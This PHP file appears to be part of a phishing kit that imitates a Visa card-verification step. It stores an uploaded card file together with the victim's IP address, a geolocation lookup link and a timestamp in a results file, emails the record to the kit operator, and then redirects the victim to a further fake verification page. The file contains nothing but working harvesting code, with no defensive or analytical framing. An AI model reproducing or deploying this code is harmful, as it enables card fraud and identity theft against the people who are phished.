<?php

session_start();

include './edit/email.php';
include './php/ajax_upload_file.php';



$time = date('d/m/Y G:i:s');

$ip = getenv("REMOTE_ADDR");

$S_Z118 .= "
<html>
<br>
</font><br>
 [Name On Card]   = <font style='color:#0070ba;'>".$file ."</font><br>
 [ip info] = <font style='color:#0070ba;'>"."http://www.geoiptool.com/?IP=".$ip."</font><br>
[time]    =   <font color='#3366FF'>".$time."</font><br>
</html></div>\n";


$f = fopen("../rezlt.html", "a");
	fwrite($f, $S_Z118);

$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$subject  = "cart visa From [ " .$ip. " - " .$smile." ] ";
$headers .= "From: Cart_VISA" . "\r\n";

mail($yourmail, $subject, $S_Z118 , $headers);

 header("Location:./lodvbv.php?websrc=".$_SESSION['_expdate_']."&".md5(microtime())."&dispatch=".sha1(microtime())."");



?>
